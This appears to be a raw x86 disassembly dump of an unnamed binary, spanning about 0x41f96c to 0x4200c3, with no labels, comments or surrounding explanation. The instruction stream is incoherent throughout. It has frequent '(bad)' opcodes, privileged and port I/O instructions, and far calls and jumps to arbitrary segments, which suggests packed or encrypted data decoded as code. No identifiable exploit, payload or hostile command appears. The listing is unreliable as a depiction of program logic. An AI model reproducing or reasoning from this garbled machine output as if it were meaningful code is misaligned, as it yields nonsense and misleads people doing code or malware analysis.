  41f96c:	es in  eax,0x97
  41f96f:	mov    ebp,ebp
  41f971:	(bad)  
  41f972:	jo     0x41f90e
  41f974:	xchg   ecx,eax
  41f975:	jne    0x41f91a
  41f977:	xchg   ebp,eax
  41f978:	or     DWORD PTR ds:0xd13965a6,edx
  41f97e:	loopne 0x41f927
  41f980:	push   esi
  41f981:	push   ebp
  41f982:	xor    BYTE PTR ds:[ecx-0x6f05244e],ch
  41f989:	scas   al,BYTE PTR es:[edi]
  41f98a:	dec    esp
  41f98b:	bound  esp,QWORD PTR [edx-0xfb5719d]
  41f991:	repnz pop eax
  41f993:	data16 addr16 jns 0x41f9b1
  41f997:	push   ss
  41f998:	mov    edi,0xdd13de8d
  41f99d:	cli    
  41f99e:	sub    ch,BYTE PTR [edi]
  41f9a0:	out    dx,al
  41f9a1:	adc    al,0x9
  41f9a3:	int    0x7c
  41f9a5:	or     BYTE PTR [eax+0x2f],dh
  41f9a8:	test   al,0x5f
  41f9aa:	push   0xb630baf
  41f9af:	sub    BYTE PTR [edx-0x75],ch
  41f9b2:	sub    dh,BYTE PTR [ebx]
  41f9b4:	jbe    0x41fa2b
  41f9b6:	ffree  st(3)
  41f9b8:	sti    
  41f9b9:	sbb    eax,0xddbb04a
  41f9be:	daa    
  41f9bf:	aad    0xff
  41f9c1:	push   esi
  41f9c2:	aad    0x0
  41f9c4:	retf   0x10b9
  41f9c7:	inc    ecx
  41f9c8:	jecxz  0x41f96b
  41f9ca:	push   ecx
  41f9cb:	lahf   
  41f9cc:	dec    ecx
  41f9cd:	mov    ds:0x61fcec40,eax
  41f9d2:	inc    eax
  41f9d3:	xchg   esp,eax
  41f9d4:	outs   dx,BYTE PTR ds:[esi]
  41f9d5:	mov    eax,ds:0x1f25a6a3
  41f9da:	fwait
  41f9db:	rol    BYTE PTR [eax],1
  41f9dd:	fcom   DWORD PTR [edi]
  41f9df:	fcomp  st(2)
  41f9e1:	scas   al,BYTE PTR es:[edi]
  41f9e2:	mov    edi,DWORD PTR [edx+0x6a]
  41f9e5:	xchg   edi,eax
  41f9e6:	addr16 in al,0x98
  41f9e9:	xchg   BYTE PTR [ebx+ebx*1-0x22],dl
  41f9ed:	mov    bl,BYTE PTR [edi+0x3ba8ae20]
  41f9f3:	lock les esi,FWORD PTR gs:[ecx]
  41f9f7:	aam    0x38
  41f9f9:	inc    esp
  41f9fa:	and    eax,0x933d2414
  41f9ff:	les    edi,FWORD PTR [esi]
  41fa01:	test   BYTE PTR [eax],dl
  41fa03:	push   ebp
  41fa04:	add    eax,0x901da111
  41fa09:	scas   al,BYTE PTR es:[edi]
  41fa0a:	sbb    al,0xcc
  41fa0c:	sub    DWORD PTR ds:0x13fd7a14,esp
  41fa12:	fs mov DWORD PTR fs:[edi-0x7436f8c5],edi
  41fa1a:	jp     0x41fa38
  41fa1c:	pop    ss
  41fa1d:	je     0x41fa6f
  41fa1f:	sbb    BYTE PTR [eax-0x54fc6d85],dh
  41fa25:	nop
  41fa26:	inc    ebp
  41fa27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa28:	push   cs
  41fa29:	push   esi
  41fa2a:	dec    ebx
  41fa2b:	xchg   DWORD PTR [esi],edx
  41fa2d:	pop    ecx
  41fa2e:	jbe    0x41f9f0
  41fa30:	pop    ecx
  41fa31:	aam    0x8f
  41fa33:	test   DWORD PTR [ebx+ebp*8-0x29],0xd729b909
  41fa3b:	sbb    esi,DWORD PTR [edi]
  41fa3d:	push   ebp
  41fa3e:	sbb    eax,0xb0b81a12
  41fa43:	nop
  41fa44:	mov    edx,0x3ed56c6
  41fa49:	mov    dl,0x6c
  41fa4c:	cmp    BYTE PTR [edi],al
  41fa4e:	mov    al,0x70
  41fa50:	sbb    BYTE PTR [edi],al
  41fa52:	or     al,0xe5
  41fa54:	shl    BYTE PTR [ebp+0x4c],1
  41fa57:	arpl   dx,di
  41fa59:	xchg   ebx,eax
  41fa5a:	jmp    FWORD PTR [ecx+eax*2-0x49886d67]
  41fa61:	popf   
  41fa62:	sub    eax,0x8127497e
  41fa67:	adc    BYTE PTR [ecx],dl
  41fa69:	ds dec edx
  41fa6b:	xchg   ebp,eax
  41fa6c:	jmp    0xd4c4:0x192835aa
  41fa73:	into   
  41fa74:	ret    0x797b
  41fa77:	push   ebp
  41fa78:	mov    eax,ds:0x3ab1ba0
  41fa7d:	jae    0x41fac9
  41fa7f:	loopne 0x41faba
  41fa81:	dec    edx
  41fa82:	sbb    ebp,0x71
  41fa85:	mov    ch,0x90
  41fa87:	loop   0x41fa10
  41fa89:	add    ebx,DWORD PTR [esi+0x54fe1717]
  41fa8f:	or     eax,0x3fe54f64
  41fa94:	ins    DWORD PTR es:[edi],dx
  41fa95:	call   DWORD PTR [ebx+0x3250da72]
  41fa9b:	jo     0x41fa2c
  41fa9d:	pop    esi
  41fa9e:	and    BYTE PTR [edx+0x49],dl
  41faa1:	xchg   esp,eax
  41faa2:	sbb    edx,edi
  41faa4:	mov    BYTE PTR [ebx],bl
  41faa6:	lea    ebx,[esi-0x1678331d]
  41faac:	fist   DWORD PTR [eax+ecx*8]
  41faaf:	push   ecx
  41fab0:	adc    al,0xd4
  41fab2:	mov    eax,ds:0xe96d2e57
  41fab7:	jge    0x41fa3e
  41fab9:	call   0xfdca8494
  41fabe:	(bad)  
  41fabf:	mov    ah,0x41
  41fac1:	cmc    
  41fac2:	std    
  41fac3:	jb     0x41fade
  41fac5:	or     eax,0xde7e64dd
  41faca:	in     al,dx
  41facb:	push   esp
  41facc:	bound  ecx,QWORD PTR [edi+0x22457104]
  41fad2:	les    ecx,FWORD PTR [ecx-0x7f]
  41fad5:	push   es
  41fad6:	(bad)  
  41fad7:	adc    al,0x53
  41fad9:	inc    esi
  41fada:	cld    
  41fadb:	(bad)  
  41fadc:	in     eax,0x8e
  41fade:	mov    es,ecx
  41fae0:	add    DWORD PTR [edx+0xbb78ada],ecx
  41fae6:	imul   edi,esi,0xb28b1553
  41faec:	in     eax,0xa2
  41faee:	mov    WORD PTR [ebp+0x6d],es
  41faf1:	push   ecx
  41faf2:	mov    al,0x35
  41faf4:	in     eax,0x9d
  41faf6:	xor    DWORD PTR [ecx],ebp
  41faf8:	jns    0x41fb42
  41fafa:	in     eax,0xb2
  41fafc:	pop    ds
  41fafd:	jecxz  0x41fb5f
  41faff:	mov    cl,0x3
  41fb01:	test   BYTE PTR [ebx],bh
  41fb03:	xor    DWORD PTR [edi],0x7d
  41fb06:	adc    eax,0x7ba63cb5
  41fb0b:	icebp  
  41fb0c:	fldenv [ebx]
  41fb0e:	call   0x7ac5:0xdeb3ee23
  41fb15:	lods   al,BYTE PTR ds:[esi]
  41fb16:	xchg   ebx,edi
  41fb18:	sbb    ecx,DWORD PTR [esi+0x42]
  41fb1b:	outs   dx,BYTE PTR ds:[esi]
  41fb1c:	loope  0x41fb7c
  41fb1e:	(bad)  
  41fb1f:	dec    esp
  41fb20:	hlt    
  41fb21:	lea    esi,[eax+0x65cbcf12]
  41fb27:	popf   
  41fb28:	sub    eax,0x758fdc4
  41fb2d:	icebp  
  41fb2e:	sbb    al,0x3e
  41fb30:	and    DWORD PTR [ecx-0x78],esi
  41fb33:	aaa    
  41fb34:	cmp    ah,BYTE PTR [edi-0xbaaeaa3]
  41fb3a:	pop    ds
  41fb3b:	xor    edi,esp
  41fb3d:	out    0x66,eax
  41fb3f:	(bad)  
  41fb41:	inc    ecx
  41fb42:	mov    ds:0xa854b5d3,al
  41fb47:	fistp  DWORD PTR ds:0x3efdbc4e
  41fb4d:	push   cs
  41fb4e:	sbb    dh,al
  41fb50:	add    eax,0x3bb71d77
  41fb55:	ja     0x41fb5c
  41fb57:	mov    al,ds:0xaf0a5235
  41fb5c:	adc    eax,0xf3def9ea
  41fb61:	aaa    
  41fb62:	retf   
  41fb63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb64:	aaa    
  41fb65:	bound  eax,QWORD PTR [edx+0xa87513b]
  41fb6b:	cld    
  41fb6c:	in     al,0xfd
  41fb6e:	out    dx,al
  41fb6f:	neg    dl
  41fb71:	fucomp st(5)
  41fb73:	cmp    eax,0x3edcd505
  41fb78:	xchg   ebp,eax
  41fb79:	fld    st(6)
  41fb7b:	xchg   edx,eax
  41fb7c:	pop    edi
  41fb7d:	scas   eax,DWORD PTR es:[edi]
  41fb7e:	cmp    al,0xad
  41fb80:	aas    
  41fb81:	jle    0x41fbf3
  41fb83:	push   edx
  41fb84:	jne    0x41fb5a
  41fb86:	xchg   DWORD PTR [eax-0x29],esp
  41fb89:	sub    ecx,esi
  41fb8b:	or     al,0x4c
  41fb8d:	ins    BYTE PTR es:[edi],dx
  41fb8e:	pop    ss
  41fb8f:	cmp    eax,0xc3e83c6a
  41fb94:	and    bh,0x40
  41fb97:	jp     0x41fbb8
  41fb99:	std    
  41fb9a:	add    esp,0xffffffa7
  41fb9d:	data16 rcr ch,1
  41fba0:	fldenv [ebp-0x3b]
  41fba3:	mov    ds:0xd4d99c3f,eax
  41fba8:	cmc    
  41fba9:	stos   BYTE PTR es:[edi],al
  41fbaa:	stos   BYTE PTR es:[edi],al
  41fbab:	call   0x13da:0xff39bf98
  41fbb2:	sti    
  41fbb3:	ins    BYTE PTR es:[edi],dx
  41fbb4:	sbb    dl,BYTE PTR [edx+0x14]
  41fbb7:	retf   
  41fbb8:	icebp  
  41fbb9:	inc    eax
  41fbba:	loope  0x41fbba
  41fbbc:	int3   
  41fbbd:	aad    0x3d
  41fbbf:	pop    ss
  41fbc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fbc1:	push   edx
  41fbc2:	cmp    DWORD PTR [edi+0x3c6945b6],esi
  41fbc8:	mul    DWORD PTR [ecx+edi*1-0x80]
  41fbcc:	das    
  41fbcd:	enter  0x648e,0x16
  41fbd1:	cmp    BYTE PTR [ecx+0x62],bl
  41fbd4:	xchg   ecx,ecx
  41fbd6:	test   dh,0xae
  41fbd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fbda:	(bad)  
  41fbdb:	pop    ebp
  41fbdc:	scas   eax,DWORD PTR es:[edi]
  41fbdd:	and    BYTE PTR [ebp+esi*4+0x6811689b],cl
  41fbe4:	or     edx,DWORD PTR [esi]
  41fbe6:	mov    cl,0x82
  41fbe8:	sub    DWORD PTR [eax+0x25],0x25
  41fbec:	scas   eax,DWORD PTR es:[edi]
  41fbed:	rcr    BYTE PTR [edx-0x14],0xf9
  41fbf1:	stos   DWORD PTR es:[edi],eax
  41fbf2:	cs call 0x7087e03b
  41fbf8:	ds out dx,eax
  41fbfa:	sbb    BYTE PTR [ecx+0x7fa0f4c7],0x3f
  41fc01:	or     DWORD PTR [si+0x7176],eax
  41fc06:	jb     0x41fc29
  41fc08:	in     eax,dx
  41fc09:	lock push cs
  41fc0b:	inc    edi
  41fc0c:	dec    edx
  41fc0d:	jmp    DWORD PTR [ebp+ebp*1+0x1a18ed0a]
  41fc14:	dec    esi
  41fc15:	jge    0x41fc11
  41fc17:	mov    edx,esp
  41fc19:	dec    edx
  41fc1a:	mov    ecx,0xb82db075
  41fc1f:	repz cmp edx,DWORD PTR [eax+eax*8]
  41fc23:	out    0xa6,eax
  41fc25:	add    ecx,DWORD PTR [eax+0x4]
  41fc28:	mov    eax,ds:0xd91d5021
  41fc2d:	in     eax,0xd8
  41fc2f:	inc    ecx
  41fc30:	mov    ds:0x82f9083d,eax
  41fc35:	cmp    BYTE PTR [ebp*2+0x1b8cbf00],0xd3
  41fc3d:	mov    esp,ebx
  41fc3f:	mov    DWORD PTR [ecx+0x51],ecx
  41fc42:	arpl   WORD PTR [eax-0x73],bp
  41fc45:	sub    al,0xf9
  41fc47:	arpl   WORD PTR [esi],sp
  41fc49:	and    eax,DWORD PTR [ebp+0x1a]
  41fc4c:	(bad)  
  41fc4d:	push   ds
  41fc4e:	mov    dh,ah
  41fc50:	dec    esp
  41fc51:	xchg   ebp,eax
  41fc52:	xadd   DWORD PTR [ebp-0x4071495c],eax
  41fc59:	ret    
  41fc5a:	or     esp,eax
  41fc5c:	enter  0x897c,0x5f
  41fc60:	(bad)  
  41fc61:	cmp    edx,DWORD PTR [edi]
  41fc63:	test   esp,0x73e93b80
  41fc69:	jge    0x41fca0
  41fc6b:	xor    DWORD PTR ds:0x1302e79c,edi
  41fc71:	pop    es
  41fc72:	mov    dh,0x56
  41fc74:	pop    esi
  41fc75:	add    BYTE PTR [edi],cl
  41fc77:	or     al,0x14
  41fc79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc7a:	sar    esp,1
  41fc7c:	xchg   edi,eax
  41fc7d:	ret    
  41fc7e:	push   ds
  41fc7f:	jns    0x41fc4d
  41fc81:	in     al,dx
  41fc82:	jl     0x41fc1a
  41fc84:	mov    ds:0x2304b509,al
  41fc89:	or     edi,DWORD PTR [edx+0x5c6fa622]
  41fc8f:	(bad)  
  41fc90:	lods   al,BYTE PTR ds:[esi]
  41fc91:	xchg   edx,eax
  41fc92:	nop
  41fc93:	ins    BYTE PTR es:[edi],dx
  41fc94:	adc    cl,BYTE PTR [ecx+0x45b7b2de]
  41fc9a:	leave  
  41fc9b:	xlat   BYTE PTR ds:[ebx]
  41fc9c:	loopne 0x41fc60
  41fc9e:	or     cl,bl
  41fca0:	pop    ebp
  41fca1:	push   cs
  41fca2:	les    esp,FWORD PTR [ecx]
  41fca4:	aas    
  41fca5:	adc    eax,0xc83a477d
  41fcaa:	jb     0x41fc76
  41fcac:	xor    DWORD PTR [esi-0x169ba809],edx
  41fcb2:	mov    al,0x80
  41fcb4:	(bad)  
  41fcb5:	xor    DWORD PTR [ebx],ebx
  41fcb7:	xor    BYTE PTR ds:0x4df98168,bl
  41fcbd:	add    al,0xe0
  41fcbf:	add    DWORD PTR [esi-0x6182959f],esi
  41fcc5:	ret    
  41fcc6:	dec    DWORD PTR [eax+0x4a]
  41fcc9:	pop    ss
  41fcca:	jne    0x41fc60
  41fccc:	call   0x2363:0x53252547
  41fcd3:	in     eax,dx
  41fcd4:	mov    esp,eax
  41fcd6:	mov    eax,ds:0xadc4ed67
  41fcdb:	inc    esi
  41fcdc:	jmp    0x4c4c:0x740831e6
  41fce3:	loop   0x41fcc6
  41fce5:	test   bl,0x80
  41fce8:	add    eax,0x37584a9e
  41fced:	mov    ah,0x15
  41fcef:	xor    al,0xf0
  41fcf1:	jge    0x41fd46
  41fcf3:	xchg   DWORD PTR [edi+0x4b43c6e6],ebx
  41fcf9:	(bad)  
  41fcfa:	rcl    dh,0x2d
  41fcfd:	cwde   
  41fcfe:	inc    ebp
  41fcff:	ret    0xbd16
  41fd02:	push   ss
  41fd03:	stos   DWORD PTR es:[edi],eax
  41fd04:	xchg   edx,eax
  41fd05:	in     al,0x31
  41fd07:	aam    0xbd
  41fd09:	ror    DWORD PTR [esi-0x1d340b8c],cl
  41fd0f:	lahf   
  41fd10:	shl    DWORD PTR [ebx],1
  41fd12:	xor    edx,esp
  41fd14:	xor    esi,DWORD PTR [esi+edi*8+0x9]
  41fd18:	out    0xd0,eax
  41fd1a:	push   DWORD PTR [ebx+0x285364]
  41fd20:	add    eax,0x70026c21
  41fd25:	cli    
  41fd26:	jae    0x41fd02
  41fd28:	jns    0x41fcc3
  41fd2a:	aas    
  41fd2b:	ins    BYTE PTR es:[edi],dx
  41fd2c:	(bad)  
  41fd2d:	jecxz  0x41fd8d
  41fd2f:	add    BYTE PTR [edi-0x1a],dh
  41fd32:	xchg   ecx,eax
  41fd33:	(bad)  
  41fd34:	jmp    0x8af5f05
  41fd39:	or     cl,BYTE PTR [ebx]
  41fd3b:	cld    
  41fd3c:	mov    esp,0xee538872
  41fd41:	stos   DWORD PTR es:[edi],eax
  41fd42:	sbb    al,0x1a
  41fd44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd45:	(bad)  
  41fd47:	and    dl,dh
  41fd49:	outs   dx,BYTE PTR ds:[esi]
  41fd4a:	sub    eax,0x6e207398
  41fd4f:	xchg   BYTE PTR [edi+0x5b],bh
  41fd52:	sbb    DWORD PTR [ecx+0x4b],0xffffffcd
  41fd56:	lahf   
  41fd57:	adc    cl,BYTE PTR [edx]
  41fd59:	jmp    0x41fcf1
  41fd5b:	xchg   BYTE PTR [esi+0x70],cl
  41fd5e:	and    DWORD PTR [ebx+0x525d6b4f],edi
  41fd64:	adc    ecx,esp
  41fd66:	pop    ecx
  41fd67:	test   al,0x5c
  41fd69:	mov    bl,0x3d
  41fd6b:	fisub  WORD PTR [ecx-0x1b]
  41fd6e:	test   eax,0x5dfc3761
  41fd73:	push   ebp
  41fd74:	rol    BYTE PTR [ebx],1
  41fd76:	gs call 0xd9fd2449
  41fd7c:	daa    
  41fd7d:	outs   dx,DWORD PTR ds:[esi]
  41fd7e:	mov    al,0xb5
  41fd80:	jmp    0x41dfe66f
  41fd85:	aad    0x1b
  41fd87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd88:	pop    es
  41fd89:	imul   ecx,DWORD PTR [eax],0x3c66dd27
  41fd8f:	popf   
  41fd90:	fs (bad) 
  41fd92:	call   0xd6175de5
  41fd97:	or     dl,BYTE PTR [edi+0x14b531b]
  41fd9d:	adc    eax,0xe1f226ac
  41fda2:	push   ecx
  41fda3:	sbb    bl,BYTE PTR [eax-0x46a17a9b]
  41fda9:	xor    esp,DWORD PTR [ebp-0x7d4816f5]
  41fdaf:	sub    al,BYTE PTR [ebx+esi*1+0x29e12be7]
  41fdb6:	xlat   BYTE PTR ds:[ebx]
  41fdb7:	inc    esp
  41fdb8:	jb     0x41fd4b
  41fdba:	in     eax,0x76
  41fdbc:	or     eax,0x13dc5b2c
  41fdc1:	pop    edi
  41fdc2:	and    eax,0x5156948d
  41fdc7:	push   0xc471ce29
  41fdcc:	rcl    DWORD PTR [ebx-0x46],cl
  41fdcf:	cs mov esi,0x6bf88de4
  41fdd5:	fsub   DWORD PTR [edx]
  41fdd7:	add    DWORD PTR [ecx],ebp
  41fdd9:	loope  0x41fd7f
  41fddb:	(bad)  
  41fddc:	shl    esi,1
  41fdde:	add    eax,0x385bbe53
  41fde3:	or     eax,0x891f1eb7
  41fde8:	daa    
  41fde9:	jecxz  0x41fe1f
  41fdeb:	mov    eax,ds:0x6c7f206e
  41fdf0:	add    ebp,DWORD PTR [eax+0x2e]
  41fdf3:	and    ebx,DWORD PTR [edi-0x41]
  41fdf6:	outs   dx,BYTE PTR ds:[esi]
  41fdf7:	cmp    DWORD PTR [eax+edx*8+0x11446442],0xffffffe5
  41fdff:	jns    0x41fe1b
  41fe01:	lods   eax,DWORD PTR ds:[esi]
  41fe02:	leave  
  41fe03:	sbb    eax,0xf2b5d119
  41fe08:	rol    DWORD PTR ds:0x49731f6b,cl
  41fe0e:	inc    edi
  41fe0f:	add    dh,BYTE PTR [ebp+0x76d2983b]
  41fe15:	loope  0x41fe0c
  41fe17:	xor    edi,ebp
  41fe19:	les    ebx,FWORD PTR [ebp+0xf]
  41fe1c:	(bad)  
  41fe1d:	cmp    ecx,DWORD PTR [ebx+edi*8+0x68]
  41fe21:	add    ebx,esp
  41fe23:	imul   BYTE PTR ds:0xea422689
  41fe29:	popa   
  41fe2a:	call   0xdb42661a
  41fe2f:	call   0xb8f:0xc3ac2473
  41fe36:	jmp    0x41fe7d
  41fe38:	out    dx,eax
  41fe39:	xor    DWORD PTR [edi],esp
  41fe3b:	call   0x2cdd:0x6af182ec
  41fe42:	pop    edi
  41fe43:	push   0xffffff8b
  41fe45:	scas   eax,DWORD PTR es:[di]
  41fe47:	sbb    DWORD PTR [ebx-0x6ec48d6],esi
  41fe4d:	sub    cl,BYTE PTR [edx+0x7b5ec423]
  41fe53:	sahf   
  41fe54:	push   es
  41fe55:	mov    ebx,0x7f48bc47
  41fe5a:	pop    ecx
  41fe5b:	mov    ecx,0x139836ca
  41fe60:	jbe    0x41fe6b
  41fe62:	mov    cl,0xbf
  41fe64:	push   edi
  41fe65:	push   0xfffffff6
  41fe67:	gs (bad) 
  41fe69:	mov    al,ds:0xc68300f3
  41fe6e:	int3   
  41fe6f:	mov    ah,0x14
  41fe71:	push   ecx
  41fe72:	jns    0x41fe60
  41fe74:	popf   
  41fe75:	mov    ebp,0x69631699
  41fe7a:	push   0xffffff9f
  41fe7c:	pop    edi
  41fe7d:	xchg   edx,eax
  41fe7e:	outs   dx,DWORD PTR ds:[esi]
  41fe7f:	sbb    dh,BYTE PTR [edi-0x16]
  41fe82:	shl    ebx,1
  41fe84:	stc    
  41fe85:	pop    ecx
  41fe86:	sbb    BYTE PTR [ebx+edi*1+0x70],ch
  41fe8a:	pop    edi
  41fe8b:	sbb    al,0x9e
  41fe8d:	sar    DWORD PTR [ebp+0x0],0xae
  41fe91:	mov    dl,BYTE PTR [ecx]
  41fe93:	lds    ebp,FWORD PTR [esi-0x7d]
  41fe96:	push   0x78
  41fe98:	data16 xor al,0x7d
  41fe9b:	xor    BYTE PTR ds:0xd6b1f808,bl
  41fea1:	sti    
  41fea2:	fnstcw WORD PTR [esi-0x42b71f35]
  41fea8:	outs   dx,DWORD PTR ds:[esi]
  41fea9:	cld    
  41feaa:	sub    BYTE PTR [edx+ecx*1-0xae0e721],bh
  41feb1:	cs or  esi,edi
  41feb4:	scas   al,BYTE PTR es:[edi]
  41feb5:	sbb    al,0x2c
  41feb7:	out    dx,al
  41feb8:	test   eax,0xf272eb33
  41febd:	pop    ecx
  41febe:	fdivp  st(7),st
  41fec0:	lods   al,BYTE PTR ds:[esi]
  41fec1:	inc    edi
  41fec2:	leave  
  41fec3:	cwde   
  41fec4:	data16 adc al,0xb8
  41fec7:	and    eax,0x1d39a358
  41fecc:	scas   eax,DWORD PTR es:[edi]
  41fecd:	cs gs push ss
  41fed0:	pop    esp
  41fed1:	retf   0x4ec9
  41fed4:	push   edi
  41fed5:	push   ecx
  41fed6:	ret    0xfca4
  41fed9:	push   eax
  41feda:	xchg   edx,eax
  41fedb:	stos   BYTE PTR es:[edi],al
  41fedc:	and    ecx,ecx
  41fede:	cmp    ecx,edx
  41fee0:	mov    BYTE PTR [ebp-0x2d7635c2],dl
  41fee6:	dec    ebp
  41fee7:	cmp    ecx,esi
  41fee9:	ret    
  41feea:	add    esp,DWORD PTR [ebx+0x7f]
  41feed:	dec    eax
  41feee:	(bad)  
  41feef:	jae    0x41ff62
  41fef1:	push   0xffffffd6
  41fef3:	fisttp DWORD PTR [ecx+edi*8-0x4b]
  41fef7:	int3   
  41fef8:	jae    0x41ff5c
  41fefa:	test   ax,0x189
  41fefe:	xor    eax,0x1e6a060e
  41ff03:	mov    edx,0xa8296aa2
  41ff08:	and    al,0xaf
  41ff0a:	jp     0x41fec2
  41ff0c:	sbb    al,0xce
  41ff0e:	out    dx,al
  41ff0f:	mov    WORD PTR [eax+esi*8+0x1e9dd4c6],es
  41ff16:	and    bh,BYTE PTR [edx]
  41ff18:	adc    ecx,DWORD PTR [ebx+0x5cb32192]
  41ff1e:	leave  
  41ff1f:	pop    eax
  41ff20:	shr    BYTE PTR ds:0x73915db5,1
  41ff26:	push   edx
  41ff27:	popf   
  41ff28:	ja     0x41fee3
  41ff2a:	enter  0x9f8f,0x7c
  41ff2e:	adc    bl,BYTE PTR [ecx+0x25]
  41ff31:	dec    ebp
  41ff32:	xchg   BYTE PTR [edx],bl
  41ff34:	(bad)  
  41ff35:	sti    
  41ff36:	ficomp DWORD PTR [ebx+ebx*8-0x27]
  41ff3a:	loope  0x41fedb
  41ff3c:	inc    edx
  41ff3d:	sub    al,0x63
  41ff3f:	ja     0x41fed8
  41ff41:	hlt    
  41ff42:	nop
  41ff43:	inc    eax
  41ff44:	push   ebx
  41ff45:	(bad)  
  41ff46:	mov    BYTE PTR [eax+0x383b58a1],ch
  41ff4c:	pop    es
  41ff4d:	mov    cl,0x8e
  41ff4f:	addr16 call 0x8f5e:0xabac0d11
  41ff57:	xor    DWORD PTR [esi-0x5754c1d2],ebp
  41ff5d:	fs mov ah,0x1f
  41ff60:	xor    al,0xd8
  41ff62:	mov    eax,ds:0xff77de9a
  41ff67:	shl    DWORD PTR [esi],cl
  41ff69:	fsubrp st(1),st
  41ff6b:	arpl   bx,bx
  41ff6d:	xchg   edx,eax
  41ff6e:	fld    DWORD PTR [edi-0x55]
  41ff71:	adc    BYTE PTR [eax],ah
  41ff73:	mov    cl,0x29
  41ff75:	xchg   edx,esp
  41ff77:	and    esp,0xffffffe8
  41ff7a:	stos   BYTE PTR es:[edi],al
  41ff7b:	retf   0x1c37
  41ff7e:	jle    0x41ff19
  41ff80:	in     al,0xf3
  41ff82:	inc    edx
  41ff83:	sub    eax,0xc7301c4f
  41ff88:	dec    esi
  41ff89:	adc    DWORD PTR [edi],edi
  41ff8b:	pop    eax
  41ff8c:	cmp    ch,BYTE PTR [esi-0x3b]
  41ff8f:	test   DWORD PTR ss:0xed476c99,ebx
  41ff96:	add    cl,al
  41ff98:	fwait
  41ff99:	jmp    0x41ff7a
  41ff9b:	or     al,0xac
  41ff9d:	inc    edi
  41ff9e:	xchg   ebp,eax
  41ff9f:	push   edx
  41ffa0:	adc    DWORD PTR [edx+ebp*1-0x3b],edx
  41ffa4:	fiadd  DWORD PTR [ecx]
  41ffa6:	mov    eax,0x6db5b863
  41ffab:	inc    ecx
  41ffac:	sbb    eax,0xdfc337f6
  41ffb1:	mov    esi,fs
  41ffb3:	pop    ds
  41ffb4:	sbb    BYTE PTR ds:0x553292a6,dh
  41ffba:	int    0x78
  41ffbc:	add    DWORD PTR [edi],ebp
  41ffbe:	aam    0x53
  41ffc0:	xchg   ebp,eax
  41ffc1:	popa   
  41ffc2:	adc    al,BYTE PTR [ecx+0x54]
  41ffc5:	out    0xbe,al
  41ffc7:	mov    al,ds:0xafe83f54
  41ffcc:	sbb    eax,0xd46c6244
  41ffd1:	add    al,0xb2
  41ffd3:	scas   eax,DWORD PTR es:[edi]
  41ffd4:	cmp    eax,0x953d3c27
  41ffd9:	mov    ah,0x6a
  41ffdb:	bound  ebp,QWORD PTR [ebx-0x23]
  41ffde:	cmp    bh,BYTE PTR [edx]
  41ffe0:	jae    0x41ffce
  41ffe2:	push   0x75
  41ffe4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ffe5:	jl     0x41ff84
  41ffe7:	mov    al,ds:0x46fd526e
  41ffec:	xor    esp,edx
  41ffee:	xchg   BYTE PTR [ebp-0x29f3903d],bl
  41fff4:	xor    al,0x18
  41fff6:	lods   al,BYTE PTR ds:[esi]
  41fff7:	enter  0x89ce,0xed
  41fffb:	mov    BYTE PTR ss:[edi+ebp*8],ah
  41ffff:	lea    ebx,[eax+esi*4]
  420002:	or     al,0x7e
  420004:	sub    ah,BYTE PTR [ecx-0x603923a7]
  42000a:	fnstcw WORD PTR [ebx]
  42000c:	cli    
  42000d:	(bad)  
  42000e:	out    dx,eax
  42000f:	jnp    0x41ff9b
  420011:	and    BYTE PTR [esi+0x26ce6601],bh
  420017:	mov    ds:0x35382a78,eax
  42001c:	add    DWORD PTR [ecx],0xd93965e4
  420022:	dec    ebx
  420023:	fs pop ds
  420025:	pushw  es
  420027:	loopne 0x42007a
  420029:	int    0xf5
  42002b:	pop    ds
  42002c:	das    
  42002d:	sub    BYTE PTR [ebx-0x51],ch
  420030:	mov    edi,0x1fc38e95
  420035:	test   BYTE PTR [edi+eax*1+0x48],0xb9
  42003a:	aad    0x91
  42003c:	clts   
  42003e:	push   ebx
  42003f:	test   BYTE PTR [edi-0x45],cl
  420042:	jae    0x42000d
  420044:	jmp    0x420089
  420046:	inc    edx
  420047:	dec    ebx
  420048:	xor    BYTE PTR [ebp+0x687b1543],0xf6
  42004f:	mov    eax,0x2e309c6d
  420054:	pop    esi
  420055:	ret    0x96b
  420058:	in     al,0xfb
  42005a:	out    dx,al
  42005b:	pop    es
  42005c:	arpl   WORD PTR [esi-0x13adc8ac],bp
  420062:	xor    dl,bh
  420064:	lods   eax,DWORD PTR ds:[esi]
  420065:	cmp    eax,eax
  420067:	push   ecx
  420068:	adc    eax,0x2778643a
  42006d:	push   ss
  42006e:	mov    ds:0x836a939,eax
  420073:	xchg   ebx,eax
  420074:	(bad)  
  420076:	cdq    
  420077:	iret   
  420078:	jo     0x420004
  42007a:	fnstcw WORD PTR [ebx]
  42007c:	stos   DWORD PTR es:[edi],eax
  42007d:	mov    ?,WORD PTR [ecx-0x24]
  420080:	int3   
  420081:	jecxz  0x4200ae
  420083:	and    al,0x12
  420085:	sbb    DWORD PTR [edi-0x79],ebx
  420088:	jnp    0x4200b3
  42008a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42008b:	dec    ebx
  42008c:	aad    0xb8
  42008e:	ja     0x42001e
  420090:	pop    ss
  420091:	icebp  
  420092:	dec    ebp
  420093:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420094:	mov    bl,0x54
  420096:	or     BYTE PTR [edx],ah
  420098:	adc    DWORD PTR [ebx+0x438269ef],esi
  42009e:	test   BYTE PTR [edx+0x3],bh
  4200a1:	les    ebp,FWORD PTR [esi+ebp*4-0xc0d720e]
  4200a8:	push   ebp
  4200a9:	xchg   ebx,eax
  4200aa:	daa    
  4200ab:	jae    0x42007e
  4200ad:	inc    edx
  4200ae:	jl     0x420123
  4200b0:	inc    edi
  4200b1:	fisubr WORD PTR [esi-0x2a]
  4200b4:	cmp    DWORD PTR [ecx-0x27c43ccd],ebp
  4200ba:	stos   DWORD PTR es:[edi],eax
  4200bb:	pop    ebp
  4200bc:	and    BYTE PTR [ecx-0x2b],bl
  4200bf:	aaa    
  4200c0:	fbstp  TBYTE PTR [ecx-0x2b]
  4200c3:	mov    WORD PTR [ebx+0x51],ss
